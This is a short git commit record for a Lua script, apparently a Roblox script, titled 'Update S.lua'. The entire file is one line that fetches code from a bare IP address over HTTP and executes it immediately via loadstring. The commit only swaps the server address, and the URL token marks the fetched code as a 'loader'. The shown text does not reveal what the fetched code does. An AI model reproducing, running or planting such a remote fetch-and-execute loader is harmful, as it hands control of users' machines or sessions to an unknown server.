4dd55802b8e7f15abe9e7767e6bd575cd4b09b8e
TakZ-bit <tak72086@gmail.com>
2026-02-23 05:45:29 +0630

    Update S.lua

--- S.lua
+++ S.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijk3NDc3YTA4LTYyMDctNDkwMC04NmMwLTdlYjBlMDMwODc3ZSIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6Ijk3NDc3YTA4LTYyMDctNDkwMC04NmMwLTdlYjBlMDMwODc3ZSIsImtpbmQiOiJsb2FkZXIifQ"))()
